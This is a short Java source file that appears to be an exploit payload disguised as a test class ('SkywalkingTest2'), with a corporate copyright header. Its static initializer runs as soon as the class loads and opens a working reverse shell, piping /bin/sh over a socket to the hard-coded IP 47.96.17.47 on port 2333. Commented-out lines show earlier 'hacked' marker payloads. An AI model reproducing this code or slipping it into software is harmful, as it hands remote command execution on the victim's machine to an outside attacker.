/**
 * Alipay.com Inc. Copyright (c) 2004-2020 All Rights Reserved.
 */

import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

/**
 *
 * @author th1s
 * @version : SkywalkingTest.java, v 0.1 2020年09月27日 8:40 下午 th1s Exp $
 */
public class SkywalkingTest2 {
    static {
        try {
            //System.out.println("Hacked by fantasyC4t");
            //Runtime r = Runtime.getRuntime();
            ////r.exec("open -a Calculator");
            //r.exec("touch /tmp/tianfucuphack.txt");

            String host = "47.96.17.47";
            int port = 2333;
            String cmd = "/bin/sh";
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s = new Socket(host,port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            so.write("connect success!!!!!!!!!\n\n".getBytes());
            while(!s.isClosed()) {
                while(pi.available()>0) {
                    so.write(pi.read());
                }
                while(pe.available()>0) {
                    so.write(pe.read());
                }
                while(si.available()>0) {
                    po.write(si.read());
                }
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                }
                catch (Exception e){
                }
            };
            p.destroy();
            s.close();
        } catch (Exception e){
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        System.out.println("hhhhh");
    }
}